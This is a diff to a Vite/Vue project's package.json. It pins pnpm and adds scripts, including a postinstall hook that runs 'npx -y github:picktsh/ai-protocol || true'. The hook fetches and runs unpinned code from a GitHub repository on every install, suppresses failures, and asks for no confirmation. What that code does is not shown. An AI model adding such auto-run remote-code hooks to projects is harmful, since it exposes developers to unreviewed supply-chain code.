@@ -3,12 +3,18 @@
   "version": "0.0.0",
   "private": true,
   "type": "module",
+  "packageManager": "pnpm@10.26.2",
+  "engines": {
+    "pnpm": ">=10 <11"
+  },
   "scripts": {
     "dev": "vite",
     "build": "vite build",
     "preview": "vite preview",
     "lint": "eslint . --fix",
-    "format": "prettier --write \"src/**/*.{js,vue,css}\""
+    "format": "prettier --write \"src/**/*.{js,vue,css}\"",
+    "sync:ai": "npx -y github:picktsh/ai-protocol",
+    "postinstall": "npx -y github:picktsh/ai-protocol || true"
   },
   "dependencies": {
     "@vueuse/core": "^11.0.0",
